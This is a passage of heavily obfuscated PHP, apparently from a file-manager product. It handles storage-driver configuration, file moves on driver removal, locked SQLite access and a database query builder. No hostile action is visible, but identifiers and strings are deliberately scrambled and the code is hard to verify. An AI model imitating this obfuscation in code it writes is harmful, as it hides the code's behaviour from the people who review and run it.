$Ëñ¢İ‹±[88]) { $this->checkConfig($»²öü•); } unset($»²öü•[$Ëñ¢İ‹±[2171]]); $ùğÄû×½ = parent::update($£•â÷—¬, $»²öü•); if ($ùğÄû×½ && $»²öü•[$Ëñ¢İ‹±[37]]) { $ßÛö˜ = 0; foreach ($¿¯¥ŞŸ as $ùÂîÆ¨ç) { if ($ùÂîÆ¨ç[$Ëñ¢İ‹±[37]] && $ùÂîÆ¨ç[$Ëñ¢İ‹±[437]] != $£•â÷—¬) { $ßÛö˜ = $ùÂîÆ¨ç[$Ëñ¢İ‹±[437]]; parent::update($ùÂîÆ¨ç[$Ëñ¢İ‹±[437]], array($Ëñ¢İ‹±[37] => 0)); } } $this->updateBackup($£•â÷—¬, $ßÛö˜); } return $ùğÄû×½; } public function add($Ã©ãäØğ) { $Ö™ÎŞ– =& $_SERVER[¡“ËÌ§œ]; $¶«ÍÈò = array_to_keyvalue(parent::listData(), $Ö™ÎŞ–[32]); if (isset($¶«ÍÈò[$Ã©ãäØğ[$Ö™ÎŞ–[32]]])) { return !1; } $this->checkConfig($Ã©ãäØğ); $¡Àõ¦÷¨ = parent::insert($Ã©ãäØğ); if ($¡Àõ¦÷¨ && $Ã©ãäØğ[$Ö™ÎŞ–[37]]) { foreach ($¶«ÍÈò as $…Ìà•Ã¦) { if ($…Ìà•Ã¦[$Ö™ÎŞ–[37]]) { parent::update($…Ìà•Ã¦[$Ö™ÎŞ–[437]], array($Ö™ÎŞ–[37] => 0)); } } } return $¡Àõ¦÷¨; } public function updateBackup($•´ÃÊ¾Ï, $äñªùê) { $•Ç“¤¢Õ =& $_SERVER[¡“ËÌ§œ]; if (!$äñªùê) { return; } $‡Óõäï = Model($•Ç“¤¢Õ[769])->config(); if ($‡Óõäï[$•Ç“¤¢Õ[1631]] != $•Ç“¤¢Õ[88] || $‡Óõäï[$•Ç“¤¢Õ[771]] != $äñªùê) { return; } $ëò¯§Ó‹ = Model($•Ç“¤¢Õ[790])->get($•Ç“¤¢Õ[800]); $ëò¯§Ó‹ = json_decode($ëò¯§Ó‹, !0); if (!$ëò¯§Ó‹) { return; } $ëò¯§Ó‹[$•Ç“¤¢Õ[771]] = $•´ÃÊ¾Ï; Model($•Ç“¤¢Õ[790])->set(array($•Ç“¤¢Õ[800] => $ëò¯§Ó‹)); } public function checkPwd($ÁŒêºš¦, &$ÑÓÒÒá‘) { $õßÌÃŒ =& $_SERVER[¡“ËÌ§œ]; if (empty($ÑÓÒÒá‘[$õßÌÃŒ[6]])) { return; } $€ğôÅÖ† = json_decode($ÑÓÒÒá‘[$õßÌÃŒ[6]], !0); $úÙ‚£Šñ = $õßÌÃŒ[12]; $Çòºì¶Ò = array($õßÌÃŒ[2172], $õßÌÃŒ[2173], $õßÌÃŒ[909]); foreach ($Çòºì¶Ò as $ØÊÕÒä¢) { if (isset($€ğôÅÖ†[$ØÊÕÒä¢])) { $úÙ‚£Šñ = $ØÊÕÒä¢; break; } } if (!$úÙ‚£Šñ) { return; } $âÓÄèÕ™ = $this->getConfig($ÁŒêºš¦); $¸Ì¼ÑÖß = $âÓÄèÕ™[$úÙ‚£Šñ]; $Íß¼áË = $€ğôÅÖ†[$úÙ‚£Šñ]; if ($Íß¼áË == str_repeat($õßÌÃŒ[189], strlen($¸Ì¼ÑÖß))) { $€ğôÅÖ†[$úÙ‚£Šñ] = $¸Ì¼ÑÖß; $ÑÓÒÒá‘[$õßÌÃŒ[6]] = json_encode($€ğôÅÖ†); } else { if ($Íß¼áË != $¸Ì¼ÑÖß) { $ÑÓÒÒá‘[$õßÌÃŒ[2171]] = $õßÌÃŒ[88]; } } } public function checkConfig(&$‰í¡®“, $ø‡¦“¼± = false) { $¬Ùâ˜“Á =& $_SERVER[¡“ËÌ§œ]; $Ÿº±¥Á™ = strtolower($‰í¡®“[$¬Ùâ˜“Á[95]]); $‚šŠƒê” = json_decode($‰í¡®“[$¬Ùâ˜“Á[6]], !0); foreach ($‚šŠƒê” as $áá…™Á× => $ÒÒÉëÉº) { $‚šŠƒê”[$áá…™Á×] = trim($ÒÒÉëÉº); } $‚šŠƒê”[$¬Ùâ˜“Á[2174]] = rand_string(6); $Ò…şÁõ€ = $GLOBALS[$¬Ùâ˜“Á[6]][$¬Ùâ˜“Á[89]][$¬Ùâ˜“Á[846]]; $ÄÇÛÊŒ° = isset($Ò…şÁõ€[$Ÿº±¥Á™]) ? $Ò…şÁõ€[$Ÿº±¥Á™] : ucfirst($Ÿº±¥Á™); $ø´Ó§ËÊ = $¬Ùâ˜“Á[74] . $ÄÇÛÊŒ°; if (!$ÄÇÛÊŒ° || !class_exists($ø´Ó§ËÊ)) { if ($ø‡¦“¼±) { return LNG($¬Ùâ˜“Á[2175]); } write_log(array($¬Ùâ˜“Á[2176], $‰í¡®“, get_caller_info()), $¬Ùâ˜“Á[2177]); show_json(LNG($¬Ùâ˜“Á[2175]), !1, $‰í¡®“); } $Æƒ§–õ = new $ø´Ó§ËÊ($‚šŠƒê”); if (in_array($Ÿº±¥Á™, $Æƒ§–õ->objectDriver)) { if (!$Æƒ§–õ->isBucketCors() && !$Æƒ§–õ->setBucketCors()) { $Ë¦¡®ïº = LNG($¬Ùâ˜“Á[2178]); $Ë¦¡®ïº .= $¬Ùâ˜“Á[2179] . LNG($¬Ùâ˜“Á[2180]); if ($ø‡¦“¼±) { return $Ë¦¡®ïº; } show_json($Ë¦¡®ïº, !1); } } $¼æˆÅ‘ = rtrim($‚šŠƒê”[$¬Ùâ˜“Á[1200]], $¬Ùâ˜“Á[8]) . $¬Ùâ˜“Á[8]; $ºë¬ºï = $Æƒ§–õ->getPath($¼æˆÅ‘ . $¬Ùâ˜“Á[1204]); if (!$Æƒ§–õ->mkfile($ºë¬ºï)) { if ($ø‡¦“¼±) { return LNG($¬Ùâ˜“Á[2178]); } show_json(LNG($¬Ùâ˜“Á[2178]), !1); } $‚šŠƒê”[$¬Ùâ˜“Á[1200]] = $¼æˆÅ‘; $‰í¡®“[$¬Ùâ˜“Á[6]] = json_encode($‚šŠƒê”); $‰í¡®“[$¬Ùâ˜“Á[95]] = $ÄÇÛÊŒ°; return !0; } public function driverListSystem() { $üîüâ§¶ =& $_SERVER[¡“ËÌ§œ]; $“£’õò¼ = parent::listData(); $¢©–Æ² = array(); foreach ($“£’õò¼ as $·“°íìú) { unset($·“°íìú[$üîüâ§¶[201]], $·“°íìú[$üîüâ§¶[85]]); $·“°íìú[$üîüâ§¶[6]] = json_decode($·“°íìú[$üîüâ§¶[6]], !0); $¢©–Æ²[] = $·“°íìú; } return $¢©–Æ²; } public function defaultDriver() { $êîıÏø” =& $_SERVER[¡“ËÌ§œ]; $İâ›şìš = parent::listData(); $Ï”ğû½ = array_filter_by_field($İâ›şìš, $êîıÏø”[37], 1); $Ï”ğû½ = $Ï”ğû½[0]; if ($Ï”ğû½) { $Ï”ğû½[$êîıÏø”[6]] = json_decode($Ï”ğû½[$êîıÏø”[6]], !0); } return $Ï”ğû½; } public function driverInfo($½¹·É¥) { $Ê‰®’äÔ =& $_SERVER[¡“ËÌ§œ]; $ñğ¹—‚¹ = array_to_keyvalue(parent::listData(), $Ê‰®’äÔ[437]); if (!isset($ñğ¹—‚¹[$½¹·É¥])) { return !1; } $à¾Ââ = $ñğ¹—‚¹[$½¹·É¥]; $à¾Ââ[$Ê‰®’äÔ[6]] = json_decode($à¾Ââ[$Ê‰®’äÔ[6]], !0); return $à¾Ââ; } public function remove($á·ëÒ°ˆ) { $this->removeShareItems($á·ëÒ°ˆ); return parent::remove($á·ëÒ°ˆ); } public function removeWithFile($Øíüà, $ÖÊŠ÷Õ) { $ÂÊ¤ÒôÂ =& $_SERVER[¡“ËÌ§œ]; $ÔâšûÈ§ = array($ÂÊ¤ÒôÂ[837] => $Øíüà); $È­ÍÆ¦Ş = Model($ÂÊ¤ÒôÂ[509])->where($ÔâšûÈ§)->count(); $”Ç¬¦ˆ = Model($ÂÊ¤ÒôÂ[509])->where($ÔâšûÈ§)->sum($ÂÊ¤ÒôÂ[76]); $Â¿Œè´š = $ÖÊŠ÷Õ . $ÂÊ¤ÒôÂ[2181] . $Øíüà; $Èå„¡œŞ = LNG($ÖÊŠ÷Õ == $ÂÊ¤ÒôÂ[586] ? $ÂÊ¤ÒôÂ[2182] : $ÂÊ¤ÒôÂ[2183]); $œÉ¬èçñ = new TaskFileTransfer($Â¿Œè´š, $ÂÊ¤ÒôÂ[2177], $È­ÍÆ¦Ş, $Èå„¡œŞ . "\x28{$Øíüà}\51"); $œÉ¬èçñ->task[$ÂÊ¤ÒôÂ[783]] = (double) $”Ç¬¦ˆ; $ÉÁê«”õ = KodIO::defaultDriver(); $ñ€…â£œ = $ÉÁê«”õ[$ÂÊ¤ÒôÂ[437]]; $šŒ‰¤ĞÕ = "\173\x69\157\x3a{$ñ€…â£œ}\175\x2f"; $è³•ß– = !0; $ÛŞø·¸À = array(); $¡ğÜÒ‚ = Model($ÂÊ¤ÒôÂ[200])->where($ÔâšûÈ§)->field($ÂÊ¤ÒôÂ[2184])->select(); foreach ($¡ğÜÒ‚ as $¶Ğá‡ĞÂ) { $Óı‚§ü¡ = $¶Ğá‡ĞÂ[$ÂÊ¤ÒôÂ[84]]; $Š›´˜şº = $šŒ‰¤ĞÕ . str_replace("\173\x69\x6f\x3a{$Øíüà}\x7d\x2f", $ÂÊ¤ÒôÂ[12], $Óı‚§ü¡); if (!IO::exist($Óı‚§ü¡)) { $ÛŞø·¸À[] = $¶Ğá‡ĞÂ[$ÂÊ¤ÒôÂ[506]]; $œÉ¬èçñ->updateFileEnd($¶Ğá‡ĞÂ[$ÂÊ¤ÒôÂ[32]], $¶Ğá‡ĞÂ[$ÂÊ¤ÒôÂ[76]]); continue; } if (IO::exist($Š›´˜şº)) { $œÉ¬èçñ->updateFileEnd($¶Ğá‡ĞÂ[$ÂÊ¤ÒôÂ[32]], $¶Ğá‡ĞÂ[$ÂÊ¤ÒôÂ[76]]); continue; } if (!IO::move($Óı‚§ü¡, get_path_father($Š›´˜şº))) { $è³•ß– = !1; break; } $ÔâšûÈ§ = array($ÂÊ¤ÒôÂ[506] => $¶Ğá‡ĞÂ[$ÂÊ¤ÒôÂ[506]]); $Ó©ÁÎòŞ = array($ÂÊ¤ÒôÂ[837] => $ñ€…â£œ, $ÂÊ¤ÒôÂ[84] => $Š›´˜şº); Model($ÂÊ¤ÒôÂ[200])->where($ÔâšûÈ§)->save($Ó©ÁÎòŞ); } $this->removeByFileID($ÛŞø·¸À); if (!$è³•ß–) { $œÉ¬èçñ->stop($Â¿Œè´š); return !1; } $œÉ¬èçñ->end(); if ($ÖÊŠ÷Õ == $ÂÊ¤ÒôÂ[1820]) { $this->remove($Øíüà); } } public function progress($É²¨ìëŸ, $³™ÊÍÛÆ) { return Task::get($³™ÊÍÛÆ . $_SERVER[¡“ËÌ§œ][2181] . $É²¨ìëŸ); } private function removeByFileID($×ÇùÊœ‰ = array()) { $–ƒ¦ŠøÁ =& $_SERVER[¡“ËÌ§œ]; if (empty($×ÇùÊœ‰)) { return; } $…³Æí—¢ = array($–ƒ¦ŠøÁ[506] => array($–ƒ¦ŠøÁ[7], $×ÇùÊœ‰)); $ØØ²´˜Ğ = Model($–ƒ¦ŠøÁ[1353])->where($…³Æí—¢)->field($–ƒ¦ŠøÁ[440])->select(); if (!$ØØ²´˜Ğ) { return; } $ØØ²´˜Ğ = array_to_keyvalue($ØØ²´˜Ğ, $–ƒ¦ŠøÁ[12], $–ƒ¦ŠøÁ[440]); foreach ($ØØ²´˜Ğ as $† ™×äŞ) { Model($–ƒ¦ŠøÁ[454])->removeNow($† ™×äŞ, !1); } } private function removeShareItems($µ°èš§º) { $‹ÉŠ¸û =& $_SERVER[¡“ËÌ§œ]; $Çè¿ñ«‡ = "\173\x69\157\72{$µ°èš§º}\x7d\x2f"; $‰„ë«­ = array($‹ÉŠ¸û[440] => 0, $‹ÉŠ¸û[1195] => array($‹ÉŠ¸û[412], "{$Çè¿ñ«‡}\x25")); $·˜ÉßÑ = Model($‹ÉŠ¸û[1831])->where($‰„ë«­)->field($‹ÉŠ¸û[631])->select(); if (empty($·˜ÉßÑ)) { return; } $“«‰ÛÀ’ = array_to_keyvalue($·˜ÉßÑ, $‹ÉŠ¸û[12], $‹ÉŠ¸û[631]); Model($‹ÉŠ¸û[630])->remove($“«‰ÛÀ’); } } goto dœÏÃë¼ì¡; CßÇÂé‡­: class DbSqlite extends DbSqliteBase { public function query($Éº»õÔš) { $‡ª•í’ =& $_SERVER[¡“ËÌ§œ]; if (!CacheLock::fileLock($‡ª•í’[13])) { return !1; } $–Ç©¹ë£ = parent::query($Éº»õÔš); CacheLock::fileUnLock($‡ª•í’[13]); return $–Ç©¹ë£; } public function execute($­ßàÌÁ) { $ïÖ›ÄßŠ =& $_SERVER[¡“ËÌ§œ]; if (!CacheLock::fileLock($ïÖ›ÄßŠ[13])) { return !1; } $Ó„Ã³ = parent::execute($­ßàÌÁ); CacheLock::fileUnLock($ïÖ›ÄßŠ[13]); return $Ó„Ã³; } } class DbSqlite3 extends DbSqlite3Base { public function query($»êİºšŞ) { $öáÚÂºº =& $_SERVER[¡“ËÌ§œ]; if (!CacheLock::fileLock($öáÚÂºº[13])) { return !1; } $”ûúÎõ = parent::query($»êİºšŞ); CacheLock::fileUnLock($öáÚÂºº[13]); return $”ûúÎõ; } public function execute($É‡’ëô¥) { $ƒ‹Š¼†Ã =& $_SERVER[¡“ËÌ§œ]; if (!CacheLock::fileLock($ƒ‹Š¼†Ã[13])) { return !1; } $¬¤ê÷¹™ = parent::execute($É‡’ëô¥); CacheLock::fileUnLock($ƒ‹Š¼†Ã[13]); return $¬¤ê÷¹™; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\x6e\145\161" => "\x3c\x3e", "\x67\x74" => "\76", "\145\x67\x74" => "\76\x3d", "\154\x74" => "\x3c", "\x65\154\x74" => "\74\x3d", "\156\x6f\x74\x6c\x69\153\x65" => "\116\117\124\x20\x4c\111\113\x45", "\x6c\x69\153\145" => "\114\x49\113\105", "\x69\156" => "\x49\x4e", "\156\x6f\x74\x69\x6e" => "\x4e\x4f\x54\40\111\116", "\x6e\x6f\164\x20\151\156" => "\x4e\x4f\x54\40\111\116", "\142\x65\164\167\x65\145\156" => "\x42\105\x54\127\105\x45\x4e", "\x6e\157\x74\x62\x65\164\167\x65\145\x6e" => "\x4e\x4f\124\40\x42\x45\124\x57\x45\x45\116", "\156\x6f\164\x20\142\145\x74\x77\145\145\x6e" => "\116\x4f\x54\x20\102\105\124\127\x45\105\116"); protected $selectSql = "\123\105\114\105\103\124\45\104\x49\x53\124\111\x4e\103\124\45\x20\45\106\x49\105\114\x44\45\x20\106\x52\x4f\115\40\x25\x54\101\x42\x4c\x45\x25\x25\x4a\117\111\116\x25\45\127\x48\x45\x52\105\x25\x25\x47\122\117\125\120\x25\x25\110\x41\x56\111\116\x47\x25\x25\117\x52\104\x45\122\45\x25\x4c\x49\115\111\x54\45\x20\x25\x55\116\111\x4f\116\x25\45\x43\117\x4d\115\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $ÑŒ©¸ú² = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¡“ËÌ§œ][980], $ÑŒ©¸ú²); } public function factory($ëÜ¹ú»ì = '') { $¾Ã«‚„ =& $_SERVER[¡“ËÌ§œ]; $ëÜ¹ú»ì = $this->parseConfig($ëÜ¹ú»ì); if (empty($ëÜ¹ú»ì[$¾Ã«‚„[981]])) { think_exception(think_lang($¾Ã«‚„[982])); } $this->dbType = ucwords(strtolower($ëÜ¹ú»ì[$¾Ã«‚„[981]])); $¥¯–Û«Á = $¾Ã«‚„[983] . $this->dbType; if (class_exists($¥¯–Û«Á)) { $œšÀÄÜ = new $¥¯–Û«Á($ëÜ¹ú»ì); if ($¾Ã«‚„[984] != strtolower($ëÜ¹ú»ì[$¾Ã«‚„[981]])) { $œšÀÄÜ->dbType = strtoupper($this->dbType); } else { $œšÀÄÜ->dbType = $this->_getDsnType($ëÜ¹ú»ì[$¾Ã«‚„[936]]); } } else { think_exception(think_lang($¾Ã«‚„[985]) . $¾Ã«‚„[986] . $¥¯–Û«Á); } return $œšÀÄÜ; } public function __call($ßî†äÚÍ, $µ¤÷öï‰) { if (method_exists($this, $ßî†äÚÍ)) { return call_user_func_array(array($this, $ßî†äÚÍ), $µ¤÷öï‰); } } protected function _getDsnType($¼û‡ç¡œ) { $Ä–Œöƒ = explode($_SERVER[¡“ËÌ§œ][4], $¼û‡ç¡œ); $è€™Ööã = strtoupper(trim($Ä–Œöƒ[0])); return $è€™Ööã; } private function parseConfig($¨€†èÌó = '') { $®‚”â£È =& $_SERVER[¡“ËÌ§œ]; if (!empty($¨€†èÌó) && is_string($¨€†èÌó)) { $¨€†èÌó = $this->parseDSN($¨€†èÌó); } elseif (is_array($¨€†èÌó)) { $¨€†èÌó = array_change_key_case($¨€†èÌó); $¨€†èÌó = array($®‚”â£È[981] => $¨€†èÌó[$®‚”â£È[987]], $®‚”â£È[908] => $¨€†èÌó[$®‚”â£È[988]], $®‚”â£È[909] => $¨€†èÌó[$®‚”â£È[989]], $®‚”â£È[906] => $¨€†èÌó[$®‚”â£È[990]], $®‚”â£È[907] => $¨€†èÌó[$®‚”â£È[991]], $®‚”â£È[21] => $¨€†èÌó[$®‚”â£È[992]], $®‚”â£È[936] => $¨€†èÌó[$®‚”â£È[993]], $®‚”â£È[17] => isset($¨€†èÌó[$®‚”â£È[994]]) ? $¨€†èÌó[$®‚”â£È[994]] : array()); } elseif (empty($¨€†èÌó)) { if (think_config($®‚”â£È[995]) && $®‚”â£È[984] != strtolower(think_config($®‚”â£È[996]))) { $¨€†èÌó = $this->parseDSN(think_config($®‚”â£È[995])); } else { $¨€†èÌó = array($®‚”â£È[981] => think_config($®‚”â£È[996]), $®‚”â£È[908] => think_config($®‚”â£È[997]), $®‚”â£È[909] => think_config($®‚”â£È[998]), $®‚”â£È[906] => think_config($®‚”â£È[999]), $®‚”â£È[907] => think_config($®‚”â£È[1000]), $®‚”â£È[21] => think_config($®‚”â£È[275]), $®‚”â£È[936] => think_config($®‚”â£È[995]), $®‚”â£È[17] => think_config($®‚”â£È[1001])); } } return $¨€†èÌó; } protected function initConnect($í¶æÌ  = true) { if (1 == think_config($_SERVER[¡“ËÌ§œ][22])) { $this->_linkID = $this->multiConnect($í¶æÌ ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ıë¿ùîè => $†•­Ç¯Ì) { $this->_linkID = $†•­Ç¯Ì; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Ä¬ûõâÇ = false) { $Ö–ÌĞâ× =& $_SERVER[¡“ËÌ§œ]; static $è¿ô·¸ = array(); static $ŸŸÖÈÏÅ = -1; if (empty($è¿ô·¸)) { foreach ($this->config as $èÆîöù¬ => $Îƒˆ¥ˆì) { $è¿ô·¸[$èÆîöù¬] = explode($Ö–ÌĞâ×[50], $Îƒˆ¥ˆì); } } if (think_config($Ö–ÌĞâ×[1002])) { if ($Ä¬ûõâÇ || think_config($Ö–ÌĞâ×[424]) === !0) { $İî¢Ëâš = floor(mt_rand(0, think_config($Ö–ÌĞâ×[1003]) - 1)); $ŸŸÖÈÏÅ = $İî¢Ëâš; } else { if (is_numeric(think_config($Ö–ÌĞâ×[1004]))) { $İî¢Ëâš = think_config($Ö–ÌĞâ×[1004]); } else { $İî¢Ëâš = floor(mt_rand(think_config($Ö–ÌĞâ×[1003]), count($è¿ô·¸[$Ö–ÌĞâ×[906]]) - 1)); } } } else { $İî¢Ëâš = floor(mt_rand(0, count($è¿ô·¸[$Ö–ÌĞâ×[906]]) - 1)); $ŸŸÖÈÏÅ = $İî¢Ëâš; } $İî¢Ëâš = $ŸŸÖÈÏÅ !== -1 ? $ŸŸÖÈÏÅ : $İî¢Ëâš; $ŸÎƒÔõú = array($Ö–ÌĞâ×[908] => isset($è¿ô·¸[$Ö–ÌĞâ×[908]][$İî¢Ëâš]) ? $è¿ô·¸[$Ö–ÌĞâ×[908]][$İî¢Ëâš] : $è¿ô·¸[$Ö–ÌĞâ×[908]][0], $Ö–ÌĞâ×[909] => isset($è¿ô·¸[$Ö–ÌĞâ×[909]][$İî¢Ëâš]) ? $è¿ô·¸[$Ö–ÌĞâ×[909]][$İî¢Ëâš] : $è¿ô·¸[$Ö–ÌĞâ×[909]][0], $Ö–ÌĞâ×[906] => isset($è¿ô·¸[$Ö–ÌĞâ×[906]][$İî¢Ëâš]) ? $è¿ô·¸[$Ö–ÌĞâ×[906]][$İî¢Ëâš] : $è¿ô·¸[$Ö–ÌĞâ×[906]][0], $Ö–ÌĞâ×[907] => isset($è¿ô·¸[$Ö–ÌĞâ×[907]][$İî¢Ëâš]) ? $è¿ô·¸[$Ö–ÌĞâ×[907]][$İî¢Ëâš] : $è¿ô·¸[$Ö–ÌĞâ×[907]][0], $Ö–ÌĞâ×[21] => isset($è¿ô·¸[$Ö–ÌĞâ×[21]][$İî¢Ëâš]) ? $è¿ô·¸[$Ö–ÌĞâ×[21]][$İî¢Ëâš] : $è¿ô·¸[$Ö–ÌĞâ×[21]][0], $Ö–ÌĞâ×[936] => isset($è¿ô·¸[$Ö–ÌĞâ×[936]][$İî¢Ëâš]) ? $è¿ô·¸[$Ö–ÌĞâ×[936]][$İî¢Ëâš] : $è¿ô·¸[$Ö–ÌĞâ×[936]][0], $Ö–ÌĞâ×[17] => isset($è¿ô·¸[$Ö–ÌĞâ×[17]][$İî¢Ëâš]) ? $è¿ô·¸[$Ö–ÌĞâ×[17]][$İî¢Ëâš] : $è¿ô·¸[$Ö–ÌĞâ×[17]][0]); return $this->connect($ŸÎƒÔõú, $İî¢Ëâš); } public function parseDSN($üÅ±Ğä) { $–íõ‘ïğ =& $_SERVER[¡“ËÌ§œ]; if (empty($üÅ±Ğä)) { return !1; } $ÁŸã³è = parse_url($üÅ±Ğä); if ($ÁŸã³è[$–íõ‘ïğ[181]]) { $Ôîü•¬õ = array($–íõ‘ïğ[981] => $ÁŸã³è[$–íõ‘ïğ[181]], $–íõ‘ïğ[908] => isset($ÁŸã³è[$–íõ‘ïğ[628]]) ? $ÁŸã³è[$–íõ‘ïğ[628]] : $–íõ‘ïğ[12], $–íõ‘ïğ[909] => isset($ÁŸã³è[$–íõ‘ïğ[1005]]) ? $ÁŸã³è[$–íõ‘ïğ[1005]] : $–íõ‘ïğ[12], $–íõ‘ïğ[906] => isset($ÁŸã³è[$–íõ‘ïğ[182]]) ? $ÁŸã³è[$–íõ‘ïğ[182]] : $–íõ‘ïğ[12], $–íõ‘ïğ[907] => isset($ÁŸã³è[$–íõ‘ïğ[183]]) ? $ÁŸã³è[$–íõ‘ïğ[183]] : $–íõ‘ïğ[12], $–íõ‘ïğ[21] => isset($ÁŸã³è[$–íõ‘ïğ[84]]) ? substr($ÁŸã³è[$–íõ‘ïğ[84]], 1) : $–íõ‘ïğ[12]); } else { preg_match($–íõ‘ïğ[1006], trim($üÅ±Ğä), $Ô™²¹€); $Ôîü•¬õ = array($–íõ‘ïğ[981] => $Ô™²¹€[1], $–íõ‘ïğ[908] => $Ô™²¹€[2], $–íõ‘ïğ[909] => $Ô™²¹€[3], $–íõ‘ïğ[906] => $Ô™²¹€[4], $–íõ‘ïğ[907] => $Ô™²¹€[5], $–íõ‘ïğ[21] => $Ô™²¹€[6]); } $Ôîü•¬õ[$–íõ‘ïğ[936]] = $–íõ‘ïğ[12]; return $Ôîü•¬õ; } protected function debug() { $ùüÒõ¿¡ =& $_SERVER[¡“ËÌ§œ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ùüÒõ¿¡[1007]; if (think_config($ùüÒõ¿¡[1008])) { think_status($ùüÒõ¿¡[1009]); think_trace($this->queryStr . $ùüÒõ¿¡[1010] . think_status($ùüÒõ¿¡[24], $ùüÒõ¿¡[1009], 6) . $ùüÒõ¿¡[1011], $ùüÒõ¿¡[12], $ùüÒõ¿¡[1012]); } } protected function parseLock($ãÍö±äÒ = false) { $š¡ó˜„÷ =& $_SERVER[¡“ËÌ§œ]; if (!$ãÍö±äÒ) { return $š¡ó˜„÷[12]; } if ($š¡ó˜„÷[938] == $this->dbType) { return $š¡ó˜„÷[1013]; } return $š¡ó˜„÷[1014]; } protected function parseSet($Éêúæ¸) { $ÏÆ˜ãßş =& $_SERVER[¡“ËÌ§œ]; foreach ($Éêúæ¸ as $¤Æ éùÒ => $¤–ñÎåÇ) { if (is_array($¤–ñÎåÇ) && $ÏÆ˜ãßş[326] == $¤–ñÎåÇ[0]) { $ëëæÆõë[] = $this->parseKey($¤Æ éùÒ) . $ÏÆ˜ãßş[904] . $¤–ñÎåÇ[1]; } elseif (is_scalar($¤–ñÎåÇ) || is_null($¤–ñÎåÇ)) { $ëëæÆõë[] = $this->parseKey($¤Æ éùÒ) . $ÏÆ˜ãßş[904] . $this->parseValue($¤–ñÎåÇ); } } return $ÏÆ˜ãßş[1015] . implode($ÏÆ˜ãßş[50], $ëëæÆõë); } protected function bindParam($îğ‘¢¬‘, $ÊŞò×Ûè) { $this->bind[$_SERVER[¡“ËÌ§œ][4] . $îğ‘¢¬‘] = $ÊŞò×Ûè; } protected function parseBind($ùë½Îàí) { $ùë½Îàí = array_merge($this->bind, $ùë½Îàí); $this->bind = array(); return $ùë½Îàí; } function parseKey(&$ì¿£Š±†, $šÇŸÖ¨€ = true) { if ($šÇŸÖ¨€) { $ì¿£Š±† = $this->parseKeyCheck($ì¿£Š±†); } return $ì¿£Š±†; } function parseKeyCheck($†‹¬İ’–) { $ÜÂ–¡¬Á =& $_SERVER[¡“ËÌ§œ]; $†‹¬İ’– = trim($†‹¬İ’–); if (!preg_match($ÜÂ–¡¬Á[1016], $†‹¬İ’–)) { think_exception($ÜÂ–¡¬Á[1017] . $†‹¬İ’–); } return $†‹¬İ’–; } protected function parseValue($¬Éíô´) { $íãæƒé =& $_SERVER[¡“ËÌ§œ]; if (is_string($¬Éíô´)) { $¬Éíô´ = $íãæƒé[977] . $this->escapeString($¬Éíô´) . $íãæƒé[977]; } elseif (isset($¬Éíô´[0]) && is_string($¬Éíô´[0]) && strtolower($¬Éíô´[0]) == $íãæƒé[326]) { $¬Éíô´ = $this->escapeString($¬Éíô´[1]); } elseif (is_array($¬Éíô´)) { $¬Éíô´ = array_map(array($this, $íãæƒé[978]), $¬Éíô´); } elseif (is_bool($¬Éíô´)) { $¬Éíô´ = $¬Éíô´ ? $íãæƒé[88] : $íãæƒé[198]; } elseif (is_null($¬Éíô´)) { $¬Éíô´ = $íãæƒé[103]; } return $¬Éíô´; } protected function parseField($“Ø«“¸•) { $†Ø ×çû =& $_SERVER[¡“ËÌ§œ]; if (is_string($“Ø«“¸•) && strpos($“Ø«“¸•, $†Ø ×çû[50])) { $“Ø«“¸• = explode($†Ø ×çû[50], $“Ø«“¸•); } if (is_array($“Ø«“¸•)) { $¤ãÃˆ²ş = array(); foreach ($“Ø«“¸• as $É§Ö¹Ç => $Ü±€‡á¨) { if (!is_numeric($É§Ö¹Ç)) { $¤ãÃˆ²ş[] = $this->parseKey($É§Ö¹Ç, !1) . $†Ø ×çû[1018] . $this->parseKey($Ü±€‡á¨); } else { $¤ãÃˆ²ş[] = $this->parseKey($Ü±€‡á¨); } } $òÖ¼ª·¹ = implode($†Ø ×çû[50], $¤ãÃˆ²ş); } elseif (is_string($“Ø«“¸•) && !empty($“Ø«“¸•)) { $òÖ¼ª·¹ = $“Ø«“¸•; } else { $òÖ¼ª·¹ = $†Ø ×çû[189]; } return $òÖ¼ª·¹; } protected function parseTable($Ã¿ö°) { $ğäú»™ =& $_SERVER[¡“ËÌ§œ]; if (is_array($Ã¿ö°)) { $œ±ËƒÊ  = array(); foreach ($Ã¿ö° as $µ³”ˆ‡¯ => $ÈØº£Õ«) { if (!is_numeric($µ³”ˆ‡¯)) { $œ±ËƒÊ [] = $this->parseKey($µ³”ˆ‡¯) . $ğäú»™[53] . $this->parseKey($ÈØº£Õ«); } else { $œ±ËƒÊ [] = $this->parseKey($µ³”ˆ‡¯); } } $Ã¿ö° = $œ±ËƒÊ ; } elseif (is_string($Ã¿ö°)) { if (strstr($Ã¿ö°, $ğäú»™[53])) { return $Ã¿ö°; } $Ã¿ö° = explode($ğäú»™[50], $Ã¿ö°); array_walk($Ã¿ö°, array($this, $ğäú»™[926])); } return $ğäú»™[920] . trim(implode($ğäú»™[1019], $Ã¿ö°), $ğäú»™[414]) . $ğäú»™[920]; } protected function parseWhere($ĞáèÊë¿) { $¯’¥¥¶“ =& $_SERVER[¡“ËÌ§œ]; $°ÎÅ¯¤Û = $¯’¥¥¶“[12]; if (is_string($ĞáèÊë¿)) { $°ÎÅ¯¤Û = $ĞáèÊë¿; } else { $È¥Ù‹ş” = isset($ĞáèÊë¿[$¯’¥¥¶“[1020]]) ? strtoupper($ĞáèÊë¿[$¯’¥¥¶“[1020]]) : $¯’¥¥¶“[12]; if (in_array($È¥Ù‹ş”, array($¯’¥¥¶“[1021], $¯’¥¥¶“[1022], $¯’¥¥¶“[1023]))) { $È¥Ù‹ş” = $¯’¥¥¶“[53] . 